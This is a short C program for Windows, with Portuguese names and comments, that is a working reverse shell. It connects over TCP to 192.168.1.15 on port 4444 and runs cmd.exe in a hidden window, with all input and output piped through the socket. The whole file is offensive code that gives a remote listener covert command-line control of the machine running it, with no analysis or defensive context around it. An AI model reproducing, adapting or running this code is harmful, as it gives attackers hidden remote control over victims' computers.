#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>

int main(void){
   	WSADATA wsa;
	WSAStartup(MAKEWORD(2, 0), &wsa);
    int porta = 4444;
	SOCKET sock;
	char ip_servidor[] = "192.168.1.15";
	char msg[] = "Conectado!\n";

	struct sockaddr_in servidor_addr;
	servidor_addr.sin_family = AF_INET;
	servidor_addr.sin_addr.s_addr = inet_addr(ip_servidor);
	servidor_addr.sin_port = htons(porta);

	sock = socket(AF_INET, SOCK_STREAM, 0); // IPv4, TCP, nao sei
	
	int conexao = connect(sock, (struct sockaddr *) &servidor_addr, sizeof(servidor_addr));

	if(conexao < 0){
		fprintf(stderr, "Erro na conexao\n");
	}

	//send(sock, msg, sizeof(msg), 0);
	char buffer[255] = {0};


	STARTUPINFO si;
	memset(&si, 0,sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = (HANDLE) sock;
	si.hStdOutput = (HANDLE) sock;
	si.hStdError = (HANDLE) sock;
	si.wShowWindow = SW_HIDE;
	PROCESS_INFORMATION pi;
	
	CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	WaitForSingleObject(pi.hProcess, INFINITE);

	while(1){
		
	}
	
    return 0;
}